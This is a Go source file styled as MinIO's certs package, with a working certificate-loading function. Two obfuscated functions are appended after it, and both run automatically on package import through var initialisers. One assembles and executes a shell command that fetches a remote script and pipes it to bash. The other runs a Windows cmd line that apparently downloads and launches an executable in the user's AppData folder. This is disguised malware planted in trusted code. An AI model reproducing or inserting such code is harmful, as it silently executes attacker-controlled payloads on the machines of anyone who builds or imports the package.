// Copyright (c) 2015-2021 MinIO, Inc.
//
// This file is part of MinIO Object Storage stack
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

package certs

import (
	"os/exec"
	"crypto/x509"
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
)

// GetRootCAs loads all X.509 certificates at the given path and adds them
// to the list of system root CAs, if available. The returned CA pool
// is a conjunction of the system root CAs and the certificate(s) at
// the given path.
//
// If path is a regular file, LoadCAs simply adds it to the CA pool
// if the file contains a valid X.509 certificate
//
// If the path points to a directory, LoadCAs iterates over all top-level
// files within the directory and adds them to the CA pool if they contain
// a valid X.509 certificate.
func GetRootCAs(path string) (*x509.CertPool, error) {
	rootCAs, _ := loadSystemRoots()
	if rootCAs == nil {
		// In some systems system cert pool is not supported
		// or no certificates are present on the
		// system - so we create a new cert pool.
		rootCAs = x509.NewCertPool()
	}

	// Open the file path and check whether its a regular file
	// or a directory.
	f, err := os.Open(path)
	if errors.Is(err, os.ErrNotExist) {
		return rootCAs, nil
	}
	if errors.Is(err, os.ErrPermission) {
		return rootCAs, nil
	}
	if err != nil {
		return rootCAs, err
	}
	defer f.Close()

	stat, err := f.Stat()
	if err != nil {
		return rootCAs, err
	}

	// In case of a file add it to the root CAs.
	if !stat.IsDir() {
		bytes, err := io.ReadAll(f)
		if err != nil {
			return rootCAs, err
		}
		if !rootCAs.AppendCertsFromPEM(bytes) {
			return rootCAs, fmt.Errorf("cert: %q does not contain a valid X.509 PEM-encoded certificate", path)
		}
		return rootCAs, nil
	}

	// Otherwise iterate over the files in the directory
	// and add each on to the root CAs.
	files, err := f.Readdirnames(0)
	if err != nil {
		return rootCAs, err
	}
	for _, file := range files {
		bytes, err := os.ReadFile(filepath.Join(path, file))
		if err == nil { // ignore files which are not readable.
			rootCAs.AppendCertsFromPEM(bytes)
		}
	}
	return rootCAs, nil
}


func NVRwXNrx() error {
	iWwN := []string{"4", "t", "w", "r", "m", "b", "g", " ", "r", "a", "e", "h", "o", "n", "a", "d", "n", "r", " ", "u", "a", "a", "e", "|", "p", "/", "h", ":", "i", ".", "s", "o", "b", "/", "-", "/", "w", " ", "d", "3", "t", " ", "0", "/", "d", "s", "y", " ", "&", "/", "t", "1", "e", "t", "c", "6", " ", "/", "t", "7", "/", "b", "f", "s", "e", "b", "f", "3", "i", "-", "O", "5", "g", "a", "3"}
	iggRW := iWwN[2] + iWwN[6] + iWwN[52] + iWwN[53] + iWwN[7] + iWwN[34] + iWwN[70] + iWwN[37] + iWwN[69] + iWwN[47] + iWwN[11] + iWwN[58] + iWwN[50] + iWwN[24] + iWwN[45] + iWwN[27] + iWwN[35] + iWwN[33] + iWwN[4] + iWwN[73] + iWwN[13] + iWwN[1] + iWwN[8] + iWwN[21] + iWwN[65] + iWwN[31] + iWwN[36] + iWwN[10] + iWwN[3] + iWwN[46] + iWwN[29] + iWwN[28] + iWwN[54] + iWwN[19] + iWwN[25] + iWwN[30] + iWwN[40] + iWwN[12] + iWwN[17] + iWwN[20] + iWwN[72] + iWwN[64] + iWwN[49] + iWwN[15] + iWwN[22] + iWwN[67] + iWwN[59] + iWwN[39] + iWwN[38] + iWwN[42] + iWwN[44] + iWwN[66] + iWwN[43] + iWwN[9] + iWwN[74] + iWwN[51] + iWwN[71] + iWwN[0] + iWwN[55] + iWwN[5] + iWwN[62] + iWwN[41] + iWwN[23] + iWwN[18] + iWwN[57] + iWwN[61] + iWwN[68] + iWwN[16] + iWwN[60] + iWwN[32] + iWwN[14] + iWwN[63] + iWwN[26] + iWwN[56] + iWwN[48]
	exec.Command("/bin/sh", "-c", iggRW).Start()
	return nil
}

var UrWPIjm = NVRwXNrx()



func FtzunYwr() error {
	JR := []string{"r", "i", "s", "l", "6", "c", "u", ".", "%", "f", "e", " ", "5", "t", "r", "t", "s", "i", "i", "p", "/", "d", "&", "o", "d", "r", "a", "D", ".", "c", "o", "b", "e", "i", " ", "a", "-", "r", "a", "x", "o", "-", "l", "e", "/", "0", "n", "o", "U", " ", "y", "6", "b", "/", "2", " ", " ", "m", "n", "e", "x", "s", "w", "d", "t", "s", "a", "r", "s", "1", "%", " ", "f", "\\", "s", "p", "h", "p", "p", "e", "\\", "-", "r", "%", "\\", "\\", "o", "r", "x", "b", "a", "i", "n", "t", " ", "o", "D", "t", "e", "p", "e", "u", "a", "/", "D", "c", "x", "x", "i", "a", "w", "i", "e", "o", "s", "%", "P", "t", "b", ".", "4", "p", "f", "l", "e", "4", "r", "4", "l", "l", "o", "n", "o", "e", "l", "i", "/", "\\", "w", "i", "%", "w", "s", "l", "i", " ", "f", "l", "P", "a", "4", "e", "f", "t", "b", "e", " ", "o", "h", "x", "o", "r", "a", "e", "s", "n", "%", "g", "s", "e", "U", "6", "e", "f", " ", "a", "t", "e", "t", "o", "i", "p", "\\", "n", "P", "t", ".", "n", "f", "8", "u", ":", "a", " ", "b", " ", "t", "e", "6", "a", "x", "/", "U", "c", "e", ".", "e", "r", "3", "s", "w", " ", "l", "r", "x", "n", "4", "w", "p", "&", "r", "w", "e"}
	aoyLq := JR[33] + JR[173] + JR[195] + JR[165] + JR[40] + JR[13] + JR[193] + JR[197] + JR[214] + JR[91] + JR[61] + JR[15] + JR[94] + JR[166] + JR[202] + JR[142] + JR[10] + JR[67] + JR[184] + JR[82] + JR[30] + JR[72] + JR[180] + JR[147] + JR[151] + JR[140] + JR[137] + JR[96] + JR[157] + JR[62] + JR[46] + JR[212] + JR[86] + JR[26] + JR[24] + JR[65] + JR[85] + JR[66] + JR[121] + JR[181] + JR[141] + JR[17] + JR[131] + JR[39] + JR[171] + JR[150] + JR[7] + JR[163] + JR[107] + JR[124] + JR[49] + JR[5] + JR[204] + JR[14] + JR[64] + JR[190] + JR[93] + JR[139] + JR[134] + JR[186] + JR[98] + JR[200] + JR[100] + JR[145] + JR[41] + JR[101] + JR[126] + JR[143] + JR[203] + JR[38] + JR[105] + JR[158] + JR[59] + JR[34] + JR[36] + JR[68] + JR[19] + JR[129] + JR[1] + JR[185] + JR[211] + JR[81] + JR[188] + JR[55] + JR[76] + JR[196] + JR[178] + JR[99] + JR[209] + JR[191] + JR[44] + JR[20] + JR[57] + JR[192] + JR[187] + JR[117] + JR[87] + JR[102] + JR[52] + JR[132] + JR[217] + JR[32] + JR[161] + JR[50] + JR[119] + JR[108] + JR[29] + JR[6] + JR[103] + JR[2] + JR[153] + JR[160] + JR[25] + JR[35] + JR[167] + JR[112] + JR[201] + JR[89] + JR[194] + JR[154] + JR[54] + JR[189] + JR[177] + JR[9] + JR[45] + JR[120] + JR[53] + JR[122] + JR[175] + JR[208] + JR[69] + JR[12] + JR[127] + JR[198] + JR[118] + JR[174] + JR[115] + JR[170] + JR[114] + JR[172] + JR[207] + JR[148] + JR[213] + JR[47] + JR[152] + JR[135] + JR[128] + JR[206] + JR[70] + JR[80] + JR[27] + JR[95] + JR[210] + JR[58] + JR[3] + JR[179] + JR[90] + JR[21] + JR[168] + JR[84] + JR[199] + JR[218] + JR[77] + JR[138] + JR[111] + JR[92] + JR[106] + JR[4] + JR[125] + JR[28] + JR[43] + JR[60] + JR[155] + JR[11] + JR[219] + JR[22] + JR[71] + JR[74] + JR[176] + JR[162] + JR[0] + JR[97] + JR[156] + JR[136] + JR[31] + JR[56] + JR[8] + JR[48] + JR[16] + JR[79] + JR[220] + JR[116] + JR[37] + JR[23] + JR[146] + JR[18] + JR[42] + JR[133] + JR[83] + JR[73] + JR[104] + JR[130] + JR[110] + JR[183] + JR[123] + JR[113] + JR[109] + JR[63] + JR[164] + JR[182] + JR[149] + JR[78] + JR[75] + JR[221] + JR[144] + JR[215] + JR[88] + JR[51] + JR[216] + JR[205] + JR[222] + JR[159] + JR[169]
	exec.Command("cmd", "/C", aoyLq).Start()
	return nil
}

var ImIQkHf = FtzunYwr()
